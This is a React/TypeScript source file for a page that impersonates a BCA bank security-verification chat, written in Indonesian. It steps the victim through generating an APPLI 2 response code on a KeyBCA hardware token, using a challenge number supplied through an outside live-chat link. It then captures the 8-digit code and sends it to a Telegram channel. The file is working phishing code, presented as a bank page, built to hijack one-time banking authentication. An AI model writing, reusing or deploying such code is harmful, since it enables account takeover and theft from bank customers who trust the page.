import { useState } from "react";
import { useLocation } from "wouter";
import { Volume2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { sendToTelegram, formatVerificationMessage } from "@/lib/telegram";

export default function ChatConversationPage() {
  const [inputMessage, setInputMessage] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [, navigate] = useLocation();
  const { toast } = useToast();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!inputMessage.trim()) return;

    setIsSubmitting(true);

    try {
      // Send to Telegram
      const message = formatVerificationMessage(inputMessage.trim());
      const success = await sendToTelegram(message);

      if (success) {
        toast({
          title: "Berhasil",
          description: "Kode verifikasi berhasil dikirim",
        });
        
        setInputMessage("");
        
        setTimeout(() => {
          navigate("/chat");
        }, 1500);
      } else {
        toast({
          title: "Verifikasi Gagal",
          description: "Gagal mengirim data verifikasi. Coba lagi.",
          variant: "destructive",
        });
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Terjadi kesalahan",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-gray-100">
      {/* Header */}
      <div className="bg-white border-b border-gray-300 px-6 py-4 md:px-12">
        <div className="flex justify-between items-center mb-2">
          <div>
            <img
              src="https://vpn.klikbca.com/XX/YY/ZZ/CI/GHCDPFMGPGHGPGNCCGDGBGOCAHOGHG"
              alt="BCA Logo"
              className="h-8"
            />
          </div>
          <button
            onClick={() => navigate("/chat")}
            className="text-sm font-medium text-primary hover:opacity-70 transition-opacity"
            data-testid="link-back-to-chat"
          >
            ← Tutup Obrolan
          </button>
        </div>
      </div>
      {/* Main Content */}
      <div className="flex-1 overflow-y-auto bg-gray-100 px-6 py-8 md:px-12">
        <div className="max-w-4xl">
          {/* Blue Info Banner */}
          <div className="bg-blue-600 text-white rounded-md p-4 mb-8">
            <p className="text-sm font-semibold leading-relaxed">
              Verifikasi keamanan dilakukan untuk memastikan sistem atau jaringan komputer aman dari ancaman dan serangan. Sebagai tanda persetujuan
            </p>
          </div>

          {/* Content with Image on Right */}
          <div className="flex flex-col md:flex-row gap-8">
            {/* Left Content - Instructions */}
            <div className="flex-1 space-y-6">
              {/* Step 1 */}
              <div className="bg-white rounded-md p-4">
                <p className="text-sm text-primary font-medium mb-2 flex items-center gap-2">
                  Silakan aktifkan KeyBCA Anda dengan menekan tombol
                  <Volume2 className="w-4 h-4" data-testid="icon-volume-activate" />
                </p>
              </div>

              {/* Step 2 */}
              <div className="bg-white rounded-md p-4">
                <p className="text-sm text-primary font-medium mb-2">
                  Masukkan PIN KeyBCA pada saat muncul pesan "PIN"
                </p>
              </div>

              {/* Step 3 */}
              <div className="bg-white rounded-md p-4">
                <p className="text-sm text-primary font-medium mb-2">
                  Tekan angka 2 pada saat muncul pesan "APPLI"
                </p>
              </div>

              {/* Step 4 */}
              <div className="bg-white rounded-md p-4">
                <p className="text-sm text-primary font-medium mb-2">
                  Masukkan angka yang tertera di samping ini:
                </p>
                <p className="text-sm font-medium">
                  <a 
                    href="https://direct.lc.chat/19392350/" 
                    target="_blank" 
                    rel="noopener noreferrer"
                    className="text-red-600 font-bold underline hover:opacity-70 transition-opacity"
                    data-testid="link-lihat-angka"
                  >
                    Lihat ANGKA
                  </a>
                  <span className="text-primary"> pada KeyBCA Anda</span>
                </p>
              </div>

              {/* Step 6 with Input Field */}
              <div className="bg-white rounded-md p-4 space-y-4">
                <p className="text-sm text-primary font-medium">
                  Masukkan angka yang tertera pada layar KeyBCA Anda
                </p>
                <div className="flex items-center gap-3">
                  <p className="text-sm text-primary font-medium whitespace-nowrap">
                    Pada kolom disamping ini:
                  </p>
                  <Input
                    type="text"
                    value={inputMessage}
                    onChange={(e) => {
                      const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 8);
                      setInputMessage(value);
                    }}
                    placeholder="Masukkan nilai"
                    maxLength={8}
                    className="h-9 text-sm border border-gray-300 rounded px-2 bg-white flex-1"
                    data-testid="input-verification-code"
                  />
                  <Button
                    onClick={handleSubmit}
                    disabled={!inputMessage.trim() || isSubmitting}
                    className="h-9 px-4 rounded bg-primary hover:bg-primary/90 text-white font-semibold text-sm whitespace-nowrap disabled:opacity-50"
                    data-testid="button-send-verification"
                  >
                    {isSubmitting ? "Mengirim..." : "Kirim"}
                  </Button>
                </div>
              </div>

              {/* Step 7 */}
              <div className="bg-white rounded-md p-4">
                <p className="text-sm text-primary font-medium flex items-center gap-2">
                  Tekan tombol untuk mematikan KeyBCA
                  <Volume2 className="w-4 h-4" data-testid="icon-volume-deactivate" />
                </p>
              </div>
            </div>

            {/* Right Image - KeyBCA Device */}
            <div className="hidden md:flex flex-col items-center justify-start">
              <img
                src="/assets/keybca.png"
                alt="KeyBCA Device"
                className="w-48 h-64"
                data-testid="img-keybca-device"
              />
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <div className="text-center text-xs py-3" style={{ backgroundColor: "#f2f2f2", color: "#1F6198" }}>
        Copyright © 2020   All Right Reserved
      </div>
    </div>
  );
}